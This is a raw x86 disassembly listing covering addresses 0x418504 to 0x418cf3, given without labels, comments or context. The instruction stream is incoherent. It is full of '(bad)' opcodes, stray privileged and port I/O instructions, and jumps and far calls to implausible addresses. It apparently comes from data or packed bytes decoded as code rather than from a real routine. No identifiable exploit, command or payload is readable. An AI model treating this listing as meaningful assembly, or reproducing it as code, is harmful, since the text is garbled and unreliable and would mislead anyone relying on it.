  418504:	and    cl,cl
  418506:	push   ds
  418507:	hlt    
  418508:	lock mov cl,dh
  41850b:	ss fs jnp 0x4184c0
  41850f:	push   edi
  418510:	adc    eax,0x29e04daa
  418515:	pop    es
  418516:	in     al,dx
  418517:	sbb    dl,dh
  418519:	dec    edi
  41851a:	or     edi,DWORD PTR [edi-0x56383eeb]
  418520:	in     eax,dx
  418521:	mov    dh,BYTE PTR [ebx-0x25]
  418524:	aas    
  418525:	cdq    
  418526:	push   ss
  418527:	scas   eax,DWORD PTR es:[edi]
  418528:	lods   al,BYTE PTR ds:[esi]
  418529:	mov    bh,0xe4
  41852b:	(bad)  
  41852c:	outs   dx,DWORD PTR ds:[esi]
  41852d:	mov    bl,0x99
  41852f:	rcl    BYTE PTR [esi],0x23
  418532:	dec    edx
  418533:	test   BYTE PTR [eax+esi*2],ch
  418536:	sbb    DWORD PTR [eax-0x2c12721d],ebp
  41853c:	mov    ebx,0x4c32521a
  418541:	inc    edx
  418542:	adc    eax,0xef5e9d97
  418547:	cwde   
  418548:	ror    BYTE PTR [ebp+0x4499cd88],1
  41854e:	sbb    al,dh
  418550:	and    DWORD PTR [bx+di],0x5a
  418554:	out    0x45,al
  418556:	lods   al,BYTE PTR ds:[esi]
  418557:	(bad)
  41855b:	arpl   WORD PTR [esp+ebp*2+0x15783cb3],si
  418562:	inc    ebx
  418563:	add    eax,DWORD PTR [ecx]
  418565:	rol    BYTE PTR [eax-0x54],0xcb
  418569:	jp     0x41854e
  41856b:	push   ebp
  41856c:	adc    DWORD PTR [edx],0x62
  41856f:	push   ebp
  418570:	mov    bl,0xd4
  418572:	(bad)  
  418573:	jns    0x4185b9
  418575:	lods   al,BYTE PTR ds:[esi]
  418576:	sahf   
  418577:	jno    0x418557
  418579:	ins    DWORD PTR es:[edi],dx
  41857a:	mov    al,BYTE PTR [edx+ecx*2]
  41857d:	(bad)  
  41857e:	xchg   esi,eax
  41857f:	sar    BYTE PTR [edx+edx*8-0x38],cl
  418583:	sbb    edx,DWORD PTR [esi-0x649de1a0]
  418589:	mov    esp,0xc9daf4a0
  41858e:	mov    esp,0x1beb51d2
  418593:	imul   esi,DWORD PTR [ecx-0x7beb1e0e],0x57
  41859a:	ror    esi,cl
  41859c:	dec    ebx
  41859d:	cmp    DWORD PTR [ebx+edx*4-0x7d],esi
  4185a1:	sub    BYTE PTR [ecx],bl
  4185a3:	mov    ecx,0xc19a8a8e
  4185a8:	jmp    0x4185d1
  4185aa:	mov    ch,0x38
  4185ac:	shl    edx,1
  4185ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185af:	call   eax
  4185b1:	das    
  4185b2:	fcmovnb st,st(2)
  4185b4:	cld    
  4185b5:	ret    0xc16d
  4185b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185b9:	mov    ch,0x7f
  4185bb:	stc    
  4185bc:	retf   0x7bdf
  4185bf:	jmp    0xcb1002fc
  4185c4:	in     eax,0xd
  4185c6:	ins    BYTE PTR es:[edi],dx
  4185c7:	jnp    0x418568
  4185c9:	mov    ah,BYTE PTR [edi+0x61]
  4185cc:	adc    eax,0xb722db0c
  4185d2:	fwait
  4185d3:	je     0x4185b5
  4185d5:	xor    al,0xa0
  4185d7:	sti    
  4185d8:	popf   
  4185d9:	sub    dl,0x4d
  4185dc:	or     ebx,ebp
  4185de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185df:	jmp    0x418580
  4185e1:	xor    bl,BYTE PTR [eax+0x2ca4afbd]
  4185e7:	jno    0x4185af
  4185e9:	push   esi
  4185ea:	sub    BYTE PTR [edi+0x29],dl
  4185ed:	(bad)  [edi+0x16]
  4185f0:	sahf   
  4185f1:	add    bh,bl
  4185f3:	pop    eax
  4185f4:	mov    eax,0xd5a6a09e
  4185f9:	push   cs
  4185fa:	je     0x418661
  4185fc:	sub    DWORD PTR [ecx*2-0x620318cc],ecx
  418603:	or     BYTE PTR [edx+0x56e94ac],bl
  418609:	and    BYTE PTR [eax+0x7e],ch
  41860c:	stos   BYTE PTR es:[edi],al
  41860d:	dec    esp
  41860e:	sbb    eax,0xa4b00147
  418613:	jle    0x41867a
  418615:	dec    edi
  418616:	and    bl,BYTE PTR [esi+0x2b41612]
  41861c:	cdq    
  41861d:	cld    
  41861e:	call   0x3934f06e
  418623:	ins    DWORD PTR es:[edi],dx
  418624:	cmc    
  418625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418626:	and    DWORD PTR [edx],esi
  418628:	lea    edi,[edi+0x20]
  41862b:	sbb    BYTE PTR [edx-0x407eab7],bl
  418631:	das    
  418632:	je     0x41864a
  418634:	fist   DWORD PTR [ecx-0x4f]
  418637:	mov    ecx,DWORD PTR [ecx-0x7c413171]
  41863d:	pop    edi
  41863e:	sar    DWORD PTR [ecx],1
  418640:	inc    ecx
  418641:	xor    al,0x37
  418643:	push   ebx
  418644:	aam    0x79
  418646:	or     eax,0xc16c124f
  41864b:	and    esp,0x5447a1fc
  418651:	stos   BYTE PTR es:[edi],al
  418652:	or     al,0x93
  418654:	jmp    0x3f5a:0x18b8209c
  41865b:	(bad)  
  41865c:	pop    eax
  41865d:	loope  0x4186a9
  41865f:	sbb    eax,0x39f22d22
  418664:	push   ss
  418665:	mov    edi,0xb65368ac
  41866a:	jne    0x418624
  41866c:	xor    BYTE PTR [ebp+0x54ac9a79],ah
  418672:	fucomp st(6)
  418674:	xchg   ebp,eax
  418675:	xor    BYTE PTR cs:[edx-0x4c],dl
  418679:	fwait
  41867a:	arpl   WORD PTR [ebx*1-0x2fa58734],cx
  418681:	int    0x89
  418683:	xchg   ebp,eax
  418684:	imul   ebx,DWORD PTR [ecx+0x70],0xffffff83
  418688:	fwait
  418689:	cli    
  41868a:	or     DWORD PTR [ecx-0x564792b5],esp
  418690:	ret    0xba52
  418693:	inc    esi
  418694:	scas   al,BYTE PTR es:[edi]
  418695:	push   ds
  418696:	xchg   DWORD PTR [edi],ebp
  418698:	test   ch,al
  41869a:	dec    edx
  41869b:	fadd   DWORD PTR ds:0xb3d89e96
  4186a1:	inc    ecx
  4186a2:	ss and ecx,esp
  4186a5:	test   dh,dl
  4186a7:	jge    0x418690
  4186a9:	icebp  
  4186aa:	pop    edi
  4186ab:	mov    ecx,0xf1f0784a
  4186b0:	inc    ebp
  4186b1:	mov    eax,ds:0x91c5844f
  4186b6:	inc    ecx
  4186b7:	ds push 0x25a247ab
  4186bd:	rol    DWORD PTR [edx+0x7b1a7e7],1
  4186c3:	adc    esp,eax
  4186c5:	sub    DWORD PTR [ecx],0xfc098d2a
  4186cb:	shl    DWORD PTR [edi-0x5e2a3e9c],cl
  4186d1:	push   eax
  4186d2:	dec    ebx
  4186d3:	pop    esp
  4186d4:	or     eax,0xafc01d29
  4186d9:	dec    esi
  4186da:	mov    eax,0x3d6468ee
  4186df:	mov    edx,0x61608aff
  4186e4:	mov    eax,0xd313dc2e
  4186e9:	std    
  4186ea:	pop    ebp
  4186eb:	cs ins DWORD PTR es:[edi],dx
  4186ed:	inc    ebx
  4186ee:	outs   dx,BYTE PTR ds:[esi]
  4186ef:	jp     0x418770
  4186f1:	xchg   edx,eax
  4186f2:	fnsave [edx+0x62]
  4186f5:	enter  0x4b23,0xa
  4186f9:	push   0xa07e6b87
  4186fe:	or     esi,DWORD PTR gs:[edi+0x50]
  418702:	xor    esp,ecx
  418704:	hlt    
  418705:	xor    ecx,0x954aa81e
  41870b:	rcr    DWORD PTR [edi],1
  41870d:	push   ecx
  41870e:	sahf   
  41870f:	in     eax,0xae
  418711:	inc    eax
  418712:	mov    WORD PTR [ebx+0x4f8fb1a3],cs
  418718:	jae    0x4186e7
  41871a:	mov    cs,WORD PTR [eax-0x1a]
  41871d:	stos   DWORD PTR es:[edi],eax
  41871e:	inc    ebp
  41871f:	rcr    BYTE PTR [edx],0xe7
  418722:	pop    edi
  418723:	inc    ebx
  418724:	(bad)  
  418725:	fdiv   DWORD PTR [esi-0x4a]
  418728:	mov    al,0x1e
  41872a:	jno    0x41874b
  41872c:	mov    bh,0xbc
  41872e:	adc    eax,0x71fc0f19
  418733:	std    
  418734:	and    al,0x2b
  418736:	mov    gs:0xc3c1d14c,al
  41873c:	ret    0xe4e2
  41873f:	mov    eax,0x5859c0e7
  418744:	jo     0x4186c7
  418746:	jbe    0x418726
  418748:	and    ah,BYTE PTR [ebx]
  41874a:	jmp    0xdd9:0xcd46a2ee
  418751:	je     0x418761
  418753:	ins    DWORD PTR es:[edi],dx
  418754:	mov    al,0xcb
  418756:	daa    
  418757:	adc    BYTE PTR [ebx+0x2b5d9aa9],ah
  41875d:	repz jae 0x4186f8
  418760:	sub    edx,esp
  418762:	in     al,0xd8
  418764:	xlat   BYTE PTR ds:[ebx]
  418765:	dec    edi
  418766:	jl     0x418791
  418768:	cmp    eax,DWORD PTR [ecx-0x5d8b0708]
  41876e:	das    
  41876f:	add    eax,0x539e9583
  418774:	adc    al,0x29
  418776:	mov    edx,0x2dc85b5b
  41877b:	fistp  WORD PTR [ecx]
  41877d:	mov    dh,0xbf
  41877f:	sbb    BYTE PTR [ebx],dh
  418781:	pop    ebp
  418782:	dec    esp
  418783:	mov    eax,ds:0x23b23fd6
  418788:	ret    0x2fa7
  41878b:	imul   ecx,DWORD PTR [eax+0x5b251d22],0x71d5ff65
  418795:	dec    edi
  418796:	mov    dl,0x11
  418798:	repz hlt 
  41879a:	das    
  41879b:	jo     0x4187a7
  41879d:	stos   DWORD PTR es:[edi],eax
  41879e:	clc    
  41879f:	ss jns 0x418810
  4187a2:	mov    ds:0xa68e740e,al
  4187a7:	add    BYTE PTR [ecx],cl
  4187a9:	ret    
  4187aa:	mov    edi,0x8341d690
  4187af:	rcr    ah,cl
  4187b1:	inc    edx
  4187b2:	and    dh,BYTE PTR [ebx+0x17]
  4187b5:	sub    bh,BYTE PTR [ebp-0x66]
  4187b8:	es out dx,eax
  4187ba:	jno    0x4187b3
  4187bc:	mov    bh,BYTE PTR [edi+0x6cf054a0]
  4187c2:	mov    ds:0x1c658911,eax
  4187c7:	les    ebp,FWORD PTR [edx-0x408da297]
  4187cd:	mov    ecx,0x886f9ff4
  4187d2:	dec    ebp
  4187d3:	jecxz  0x4187a8
  4187d5:	push   0x6e00bba9
  4187da:	std    
  4187db:	gs inc edx
  4187dd:	and    BYTE PTR [edi],al
  4187df:	retf   
  4187e0:	scas   al,BYTE PTR es:[edi]
  4187e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187e2:	mov    ?,WORD PTR es:[eax-0x77]
  4187e6:	or     dh,BYTE PTR [esi+edi*8-0x372bb0e4]
  4187ed:	adc    ecx,DWORD PTR [edi+0x2005c240]
  4187f3:	ss clc 
  4187f5:	sbb    ebp,DWORD PTR [esi-0x2d]
  4187f8:	jl     0x418795
  4187fa:	mov    al,ds:0x106c1649
  4187ff:	mov    ch,0x63
  418801:	xor    BYTE PTR [esi-0x6ec791ca],0x44
  418808:	or     al,0xc8
  41880a:	scas   al,BYTE PTR es:[edi]
  41880b:	inc    edi
  41880c:	stos   DWORD PTR es:[edi],eax
  41880d:	xor    BYTE PTR [eax],dh
  41880f:	(bad)  
  418810:	adc    al,0x11
  418812:	inc    edi
  418813:	inc    edx
  418814:	out    dx,eax
  418815:	icebp  
  418816:	lock inc ebp
  418818:	(bad)  
  418819:	adc    eax,0x7f1d09f
  41881e:	das    
  41881f:	xor    eax,0x8a6d7673
  418824:	sti    
  418825:	mov    cs:0x48395ef,al
  41882b:	dec    edi
  41882c:	add    al,BYTE PTR [ecx+0x50973f76]
  418832:	and    bh,BYTE PTR cs:[ebp+0x2c]
  418836:	jmp    0x29876f49
  41883b:	cmp    al,0x65
  41883d:	xchg   edx,eax
  41883e:	ret    
  41883f:	sub    BYTE PTR [edi-0x4ebec250],dh
  418845:	jle    0x4188a4
  418847:	add    al,0xbd
  41884a:	repz idiv BYTE PTR [ebp+ebx*2-0x51]
  41884f:	add    ebp,DWORD PTR [edi-0x782a857f]
  418855:	punpckhbw mm3,QWORD PTR [esi-0x3f]
  418859:	inc    ebx
  41885a:	enter  0x914e,0x91
  41885e:	cld    
  41885f:	or     DWORD PTR [edx-0x3ca01396],ecx
  418865:	dec    edi
  418866:	dec    esp
  418867:	mov    bl,0xfd
  418869:	les    eax,FWORD PTR [ecx]
  41886b:	xor    bl,BYTE PTR [edx+0xb]
  41886e:	sti    
  41886f:	fldenv [ebp-0x314640de]
  418875:	int3   
  418876:	(bad)  
  418877:	in     eax,0x68
  418879:	into   
  41887a:	xor    eax,0x4a4225bf
  41887f:	mov    cl,0xdf
  418881:	in     al,0x41
  418883:	stos   DWORD PTR es:[edi],eax
  418884:	push   ds
  418885:	out    0x92,eax
  418887:	pushw  0xffde
  41888a:	call   0x9cc3:0xbd95c290
  418891:	fimul  DWORD PTR [esi+ebx*8+0xebcb3c0]
  418898:	sub    eax,0x8aea8da4
  41889d:	bound  esp,QWORD PTR [ecx+0x68]
  4188a0:	(bad)  
  4188a1:	dec    eax
  4188a2:	inc    esi
  4188a3:	add    al,0x7b
  4188a5:	add    BYTE PTR [eax-0x9bc9522],dl
  4188ab:	outs   dx,BYTE PTR ds:[esi]
  4188ac:	cmp    ebp,ebp
  4188ae:	fbstp  TBYTE PTR [edx-0xc]
  4188b1:	or     eax,0x9911cc46
  4188b6:	dec    edx
  4188b7:	(bad)  
  4188b8:	arpl   WORD PTR [ecx-0x26157f76],dx
  4188be:	inc    eax
  4188bf:	mov    ecx,0x41bf0a2c
  4188c4:	push   ebp
  4188c5:	add    eax,0x14a73777
  4188ca:	and    DWORD PTR ds:0x50dc3678,edi
  4188d0:	call   0x173d6485
  4188d5:	add    eax,edx
  4188d7:	inc    eax
  4188d8:	pop    esi
  4188d9:	shl    eax,cl
  4188db:	(bad)
  4188de:	mov    edx,0x62163124
  4188e3:	popf   
  4188e4:	sub    eax,0x3f354a78
  4188e9:	push   es
  4188ea:	mov    bp,0x9586
  4188ee:	add    eax,0xf3b5a420
  4188f3:	cdq    
  4188f4:	scas   eax,DWORD PTR es:[edi]
  4188f5:	push   cs
  4188f6:	fcomi  st,st(2)
  4188f8:	loopne 0x4188f8
  4188fa:	sbb    dl,dl
  4188fc:	psubusw mm4,QWORD PTR [eax]
  4188ff:	push   esp
  418900:	cmp    al,ah
  418902:	xchg   ebx,eax
  418903:	div    BYTE PTR [eax-0x7ff8c5f3]
  418909:	xchg   esi,eax
  41890a:	(bad)  
  41890b:	repz out 0x3a,al
  41890e:	jno    0x418966
  418910:	aad    0x69
  418912:	jnp    0x418991
  418914:	pushf  
  418915:	jg     0x418923
  418917:	dec    ecx
  418918:	stos   BYTE PTR es:[edi],al
  418919:	jne    0x4188b2
  41891b:	xchg   esp,eax
  41891c:	popf   
  41891d:	jmp    0x77810902
  418922:	xchg   esp,eax
  418923:	adc    al,0x7
  418925:	mov    ch,0x62
  418927:	call   0xeb7ac419
  41892c:	sbb    eax,0xbec48ce9
  418931:	retf   
  418932:	xchg   ebp,eax
  418933:	and    edi,ebx
  418935:	sbb    ecx,esp
  418937:	nop
  418938:	cli    
  418939:	adc    eax,0x55efd16a
  41893e:	ins    BYTE PTR es:[edi],dx
  41893f:	mov    ah,0xc0
  418941:	gs (bad) 
  418943:	push   ecx
  418944:	sbb    al,0x4e
  418946:	mov    edx,0xe45e24e0
  41894b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41894c:	jmp    0xc1576cdb
  418951:	push   ebx
  418952:	sti    
  418953:	sub    bl,bl
  418955:	pop    ss
  418956:	xchg   esi,ebx
  418958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418959:	add    ah,BYTE PTR [ecx+0x70]
  41895c:	jmp    0x431bddf0
  418961:	ror    dh,1
  418963:	inc    DWORD PTR [ebp-0x2b]
  418966:	adc    bl,BYTE PTR [ebx+ebx*2+0x1f]
  41896a:	in     al,0xf9
  41896c:	sbb    DWORD PTR [esi],0x5d
  41896f:	jno    0x418972
  418971:	cmp    ah,BYTE PTR [ebx+0x3038b032]
  418977:	aas    
  418978:	mov    DWORD PTR [ebx],esi
  41897a:	popf   
  41897b:	iret   
  41897c:	or     esp,DWORD PTR [eax-0x6e76a5aa]
  418982:	into   
  418983:	jg     0x418950
  418985:	push   ebp
  418986:	jecxz  0x418921
  418988:	into   
  418989:	mov    edi,0x8ec2dbef
  41898e:	scas   eax,DWORD PTR es:[edi]
  41898f:	mov    eax,0xbcec5bd4
  418994:	cmc    
  418995:	pop    ecx
  418996:	sub    ch,al
  418998:	and    DWORD PTR [edx-0x76],0xaffe5279
  41899f:	pop    ss
  4189a0:	adc    al,0x35
  4189a2:	mov    bl,bl
  4189a4:	fwait
  4189a5:	mov    ecx,0x348a1daf
  4189aa:	je     0x41893e
  4189ac:	jns    0x4189bf
  4189ae:	pop    esp
  4189af:	or     esi,DWORD PTR [edi+0x3d]
  4189b2:	adc    DWORD PTR [ebp-0x5f],ebx
  4189b5:	stos   DWORD PTR es:[edi],eax
  4189b6:	retf   
  4189b7:	xor    al,0x29
  4189b9:	adc    BYTE PTR [edi-0x387a4db3],ah
  4189bf:	ror    BYTE PTR [edx],0xd6
  4189c2:	mov    esp,0xc3582f27
  4189c7:	mov    es,WORD PTR [ecx-0x3be1bc84]
  4189cd:	repnz mov eax,ds:0xb6810e7d
  4189d3:	pushf  
  4189d4:	jbe    0x4189d0
  4189d6:	stos   BYTE PTR es:[edi],al
  4189d7:	sub    al,0xb8
  4189d9:	jns    0x4189a3
  4189db:	or     ah,BYTE PTR [ebx+edi*4+0x31]
  4189df:	pop    es
  4189e0:	out    0xf9,al
  4189e2:	dec    esi
  4189e3:	shr    DWORD PTR [eax-0x66],cl
  4189e6:	gs aas 
  4189e8:	sbb    eax,0x80b2307f
  4189ed:	stos   BYTE PTR es:[edi],al
  4189ee:	push   esi
  4189ef:	repz push edx
  4189f1:	nop
  4189f2:	pop    es
  4189f3:	in     eax,dx
  4189f4:	sbb    BYTE PTR [eax+0x6230871],0x2d
  4189fb:	sbb    al,0xd7
  4189fd:	inc    edx
  4189fe:	inc    edx
  4189ff:	cli    
  418a00:	fldcw  WORD PTR [ebx]
  418a02:	or     DWORD PTR [eax],ebx
  418a04:	jmp    0x2478:0xa34a21d2
  418a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a0c:	mov    eax,DWORD PTR [edx-0x25]
  418a0f:	or     bl,BYTE PTR [ebx+0x7f0c6ed6]
  418a15:	dec    esi
  418a16:	mov    ch,0xfc
  418a18:	in     al,dx
  418a19:	mov    ebx,0x64a3ede3
  418a1e:	add    ebx,ebp
  418a20:	push   ss
  418a21:	outs   dx,DWORD PTR ds:[esi]
  418a22:	inc    ecx
  418a23:	add    cl,BYTE PTR [eax]
  418a25:	icebp  
  418a26:	into   
  418a27:	loop   0x4189da
  418a29:	inc    esi
  418a2a:	or     edx,DWORD PTR [ebx+0x2ab84955]
  418a30:	pop    eax
  418a31:	sub    DWORD PTR [eax-0x7992b83a],edx
  418a37:	mov    esi,0xa7f8f1b4
  418a3c:	test   al,0xa1
  418a3e:	std    
  418a3f:	lods   al,BYTE PTR ds:[esi]
  418a40:	ret    0xb991
  418a43:	xchg   edx,eax
  418a44:	cmp    esp,esp
  418a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a47:	push   ss
  418a48:	pop    es
  418a49:	push   ss
  418a4a:	das    
  418a4b:	jle    0x418a2f
  418a4d:	aas    
  418a4e:	jp     0x418a6f
  418a50:	cmp    BYTE PTR [edi+eax*1+0xb6f5858],dh
  418a57:	cld    
  418a58:	sub    bh,al
  418a5a:	jnp    0x418a0b
  418a5c:	ret    
  418a5d:	pop    ss
  418a5e:	outs   dx,BYTE PTR ds:[esi]
  418a5f:	xor    bl,cl
  418a61:	dec    ecx
  418a62:	jo     0x418a73
  418a64:	sub    al,0xfe
  418a66:	mov    bh,0x3a
  418a68:	mov    ebp,0x6937bbbd
  418a6d:	in     al,0xd3
  418a6f:	adc    eax,0x273d765
  418a74:	sbb    esi,DWORD PTR [ecx+0x13]
  418a77:	sar    DWORD PTR [ebx],1
  418a79:	push   ds
  418a7a:	xchg   ebp,eax
  418a7b:	or     DWORD PTR [edi-0x45e465dc],0xd388648d
  418a85:	jge    0x418a46
  418a87:	sub    BYTE PTR [ebx+0x2f],bh
  418a8a:	cmp    DWORD PTR [edi-0x34bd5b93],ebp
  418a90:	pop    ebx
  418a91:	push   ebx
  418a92:	jmp    0xdbd0ccac
  418a97:	jnp    0x418b15
  418a99:	sbb    bh,BYTE PTR [ecx*1-0x47c7ca61]
  418aa0:	shl    BYTE PTR [ebp-0x74275566],cl
  418aa6:	nop
  418aa7:	and    bl,BYTE PTR [ecx+0x58]
  418aaa:	(bad)  
  418aab:	push   ds
  418aac:	fdivrp st(0),st
  418aae:	xchg   ecx,eax
  418aaf:	repz push ss
  418ab1:	test   ecx,ebp
  418ab3:	fnstcw WORD PTR [ebx+0x247e110f]
  418ab9:	sbb    al,0x57
  418abb:	mov    BYTE PTR [edi],dh
  418abd:	arpl   WORD PTR [edi+0x24d780b0],dx
  418ac3:	mov    cl,BYTE PTR [edi+0x5f]
  418ac6:	stc    
  418ac7:	(bad)  
  418ac8:	sbb    eax,0xce580f2c
  418acd:	(bad)  
  418ace:	xor    ebx,DWORD PTR ss:[ebx-0x38]
  418ad2:	cwde   
  418ad3:	xchg   edx,eax
  418ad4:	or     ch,dh
  418ad6:	cmc    
  418ad7:	mov    DWORD PTR [eax-0x2f],ecx
  418ada:	ds xchg esi,eax
  418adc:	test   DWORD PTR [edi],ebx
  418ade:	mov    eax,0xff7901a1
  418ae3:	popa   
  418ae4:	cmp    al,BYTE PTR [eax+0x63]
  418ae7:	xchg   esi,eax
  418ae8:	iret   
  418ae9:	rcl    DWORD PTR [ebp+0x2f],cl
  418aec:	add    BYTE PTR [ecx],0xb0
  418aef:	fdiv   DWORD PTR [esp+ebx*2-0x7b]
  418af3:	mov    eax,0xb9abd3c1
  418af8:	jecxz  0x418b27
  418afa:	std    
  418afb:	(bad)  
  418afc:	mov    bl,0xd6
  418afe:	mov    ch,BYTE PTR [ecx]
  418b00:	sbb    DWORD PTR [ecx+0x510fcc3],esp
  418b06:	xlat   BYTE PTR ds:[ebx]
  418b07:	gs and eax,0x7681cc6b
  418b0d:	xor    al,0x9f
  418b0f:	adc    bl,BYTE PTR [edx-0x545a9e31]
  418b15:	imul   BYTE PTR [ecx]
  418b17:	push   edi
  418b18:	std    
  418b19:	stc    
  418b1a:	fadd   DWORD PTR [ecx+edi*1-0x1d09798a]
  418b21:	or     eax,0x19065b52
  418b26:	pop    esp
  418b27:	and    DWORD PTR [esi],0x8c0ce751
  418b2d:	inc    edx
  418b2e:	pop    esi
  418b2f:	ret    0x654f
  418b32:	add    eax,0x495ab758
  418b37:	rcl    DWORD PTR [esi-0x7bbdcc5c],1
  418b3d:	push   eax
  418b3e:	std    
  418b3f:	out    dx,eax
  418b40:	scas   eax,DWORD PTR es:[edi]
  418b41:	mov    al,ds:0x689a2861
  418b46:	retw   0x7338
  418b4a:	cs xchg ch,cl
  418b4d:	dec    esi
  418b4e:	shl    dh,cl
  418b50:	mov    ds:0x72e5dd86,eax
  418b55:	add    DWORD PTR [edx+edx*1],esi
  418b58:	mov    dl,0x9e
  418b5a:	jae    0x418b8d
  418b5c:	outs   dx,BYTE PTR ds:[esi]
  418b5d:	mov    DWORD PTR [edx-0x6879db3d],edx
  418b63:	push   0xc6d2b5ed
  418b68:	sub    ah,ah
  418b6a:	mov    ecx,0x268767b5
  418b6f:	in     eax,0xab
  418b71:	setg   BYTE PTR ds:0x716ec867
  418b78:	inc    eax
  418b79:	xor    esp,DWORD PTR [edx+0x10]
  418b7c:	repz mov ds:0xf84dc94e,al
  418b82:	(bad)  
  418b84:	pop    edx
  418b85:	repnz popa 
  418b87:	ret    0xd4e5
  418b8a:	add    eax,0x5820f5fa
  418b8f:	ss jo  0x418b93
  418b92:	add    al,0xd3
  418b94:	mov    cl,0xa2
  418b96:	fucomp st(7)
  418b98:	add    al,0xe8
  418b9a:	xchg   BYTE PTR [ebx-0x62],dl
  418b9d:	inc    eax
  418b9e:	adc    BYTE PTR [edi+0x4c],dl
  418ba1:	shl    DWORD PTR [edx-0x2e],1
  418ba4:	xchg   esi,eax
  418ba5:	dec    ebx
  418ba6:	jecxz  0x418b63
  418ba8:	fild   WORD PTR [edi-0x534b4350]
  418bae:	imul   edx,DWORD PTR [ebp-0x5215bb6c],0xf657e861
  418bb8:	or     BYTE PTR [eax+edx*1+0x26],bh
  418bbc:	mov    dl,0xa7
  418bbe:	push   ss
  418bbf:	jae    0x418bad
  418bc1:	rol    DWORD PTR [edx],1
  418bc3:	or     DWORD PTR [edx-0x5e],edx
  418bc6:	or     eax,0x8cfe423
  418bcb:	sbb    DWORD PTR [ecx-0x43dcc986],0xffffffb1
  418bd2:	sbb    BYTE PTR [edx+esi*1+0x47],0xf4
  418bd7:	dec    eax
  418bd8:	ds icebp 
  418bda:	or     BYTE PTR [ebx-0x17],ah
  418bdd:	jae    0x418c1c
  418bdf:	(bad)  
  418be0:	js     0x418bca
  418be2:	test   al,0xaa
  418be4:	lahf   
  418be5:	js     0x418ba9
  418be7:	xchg   edi,eax
  418be8:	push   ecx
  418be9:	cld    
  418bea:	cmp    al,0x30
  418bec:	pop    ebp
  418bed:	fadd   QWORD PTR [eax+eiz*2]
  418bf0:	inc    ecx
  418bf1:	popf   
  418bf2:	sahf   
  418bf3:	mov    esp,0x85c869f2
  418bf8:	and    bh,0x55
  418bfb:	pop    ds
  418bfc:	cli    
  418bfd:	sub    ch,0x41
  418c00:	imul   edx,DWORD PTR [edx+0xe5059e6],0xcd3753e4
  418c0a:	les    esi,FWORD PTR [esi+0x65de13cf]
  418c10:	loope  0x418c7c
  418c12:	dec    edx
  418c13:	mov    cl,0x67
  418c15:	pop    ecx
  418c16:	push   edx
  418c17:	ja     0x418c41
  418c19:	hlt    
  418c1a:	test   eax,0x708edd6b
  418c1f:	add    al,0x67
  418c21:	push   ecx
  418c22:	push   0xef41b0c
  418c27:	(bad)  
  418c28:	ins    BYTE PTR es:[edi],dx
  418c29:	outs   dx,BYTE PTR ds:[esi]
  418c2a:	jae    0x418bdb
  418c2c:	mov    ds:0x537bc8ff,al
  418c31:	cmp    eax,0xabbecb5a
  418c36:	shl    BYTE PTR [ebx+0x2df3206a],cl
  418c3c:	(bad)  
  418c3d:	jb     0x418c98
  418c3f:	mov    edi,0x864a7c7a
  418c44:	cwde   
  418c45:	sub    bh,BYTE PTR [edi]
  418c47:	sub    al,0x15
  418c49:	inc    esi
  418c4a:	jne    0x418be7
  418c4c:	dec    ebx
  418c4d:	loopne 0x418c44
  418c4f:	xor    BYTE PTR [esi+0x4107f986],cl
  418c55:	lock pop esp
  418c57:	out    dx,al
  418c58:	std    
  418c59:	das    
  418c5a:	xchg   DWORD PTR [eax],ebp
  418c5c:	lahf   
  418c5d:	sbb    al,0x56
  418c5f:	aam    0x6f
  418c61:	sahf   
  418c62:	test   BYTE PTR [ebp-0x441ba8ab],dh
  418c68:	ror    al,1
  418c6a:	dec    esp
  418c6b:	pop    eax
  418c6c:	inc    ebx
  418c6d:	inc    edi
  418c6e:	scas   eax,DWORD PTR es:[edi]
  418c6f:	aam    0x3c
  418c71:	aaa    
  418c72:	add    eax,0xb434255e
  418c77:	or     edi,eax
  418c79:	mov    dh,0x1f
  418c7b:	adc    BYTE PTR [eax],ah
  418c7d:	out    dx,al
  418c7e:	cdq    
  418c7f:	pusha  
  418c80:	shl    ebx,0xa2
  418c83:	dec    eax
  418c84:	push   es
  418c85:	test   al,0x6b
  418c87:	pop    edi
  418c88:	sar    BYTE PTR [edx],cl
  418c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c8b:	repnz mov bh,0xe3
  418c8e:	add    ch,BYTE PTR [edx-0x5d]
  418c91:	mov    ah,0xcb
  418c93:	ins    BYTE PTR es:[edi],dx
  418c94:	pop    ecx
  418c95:	sub    DWORD PTR [ebx+ecx*1+0x6c07b6de],edx
  418c9c:	and    BYTE PTR [ecx],bh
  418c9e:	add    al,0x34
  418ca0:	cmp    BYTE PTR [edi-0x2dbe4ffd],ah
  418ca6:	lods   al,BYTE PTR ds:[esi]
  418ca7:	push   edi
  418ca8:	dec    edi
  418ca9:	mov    ds:0x58e36045,al
  418cae:	dec    edi
  418caf:	sub    DWORD PTR [edx-0x3c],esi
  418cb2:	add    ch,BYTE PTR [eax]
  418cb4:	mov    edi,0x552bdb58
  418cb9:	bound  ebp,QWORD PTR [edi+0x41]
  418cbc:	mov    esi,DWORD PTR [ebx-0x73]
  418cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cc0:	jne    0x418c4a
  418cc2:	nop
  418cc3:	and    al,0x40
  418cc5:	icebp  
  418cc6:	pop    esp
  418cc7:	cwde   
  418cc8:	add    ebp,DWORD PTR [ebx+edi*2]
  418ccb:	mov    eax,0x3d95ba39
  418cd0:	fwait
  418cd1:	pop    edi
  418cd2:	xor    DWORD PTR [ebx+0x487695c0],0x31825a6d
  418cdc:	(bad)  
  418cdd:	outs   dx,BYTE PTR ds:[esi]
  418cde:	sbb    DWORD PTR [edx],edi
  418ce0:	and    DWORD PTR [eax-0x38],ebp
  418ce3:	fdiv   DWORD PTR [ecx+ecx*8-0x57]
  418ce7:	adc    al,0x3e
  418ce9:	repnz or BYTE PTR [esi],ah
  418cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ced:	mov    esi,0x1fb722c8
  418cf2:	xchg   esi,eax
  418cf3:	lahf   
